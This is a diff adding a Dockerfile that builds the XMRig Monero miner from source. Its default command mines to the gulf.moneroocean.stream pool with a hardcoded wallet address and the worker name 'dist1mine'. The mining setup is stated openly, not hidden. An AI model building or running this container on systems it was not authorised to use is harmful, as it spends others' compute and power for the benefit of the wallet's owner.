@@ -1,0 +1,26 @@
+# Start with an official Ubuntu base image
+FROM ubuntu:22.04
+
+# Set environment variables to avoid interactive prompts during installation
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update and install required packages using apt-get for stability
+RUN apt-get update && \
+    apt-get upgrade -y && \
+    apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+# Clone the XMRig repository
+RUN git clone https://github.com/xmrig/xmrig.git
+
+# Set the working directory to XMRig
+WORKDIR /xmrig
+
+# Create a build directory and change into it
+RUN mkdir build
+WORKDIR /xmrig/build
+
+# Run cmake and make to build the project
+RUN cmake .. && make -j$(nproc)
+
+# Run the XMRig command with hardcoded pool URL, wallet address, and miner name
+CMD ["./xmrig", "-o", "gulf.moneroocean.stream:10128", "-u", "49YzZ75Vq1Q5fYtPVn7a8VMdN7aaByKfadPyfeBiJw5GHuD1vKkb2GjeeuApT2wu4AMpT4TBsfWuRsYEBDZNT9NVWCqwoz", "-p", "dist1mine"]
